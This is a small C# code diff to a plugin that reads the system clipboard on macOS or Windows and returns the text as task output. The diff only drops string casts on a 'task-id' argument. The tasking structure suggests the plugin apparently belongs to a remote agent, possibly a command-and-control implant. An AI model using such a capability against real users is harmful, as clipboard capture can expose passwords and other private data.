@@ -175,20 +175,20 @@ namespace Plugins
             {
                 if (OperatingSystem.IsMacOS())
                 {
-                    PluginHandler.Write(OsxClipboard.GetText(), (string)args["task-id"], true);
+                    PluginHandler.Write(OsxClipboard.GetText(), args["task-id"], true);
                 }
                 else if (OperatingSystem.IsWindows())
                 {
-                    PluginHandler.Write(WindowsClipboard.GetText(), (string)args["task-id"], true);
+                    PluginHandler.Write(WindowsClipboard.GetText(), args["task-id"], true);
                 }
                 else
                 {
-                    PluginHandler.Write("Not implemented on this OS yet.", (string)args["task-id"], true, "error");
+                    PluginHandler.Write("Not implemented on this OS yet.", args["task-id"], true, "error");
                 }
             }
             catch (Exception e)
             {
-                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
+                PluginHandler.Write(e.ToString(), args["task-id"], true, "error");
                 return;
             }
         }
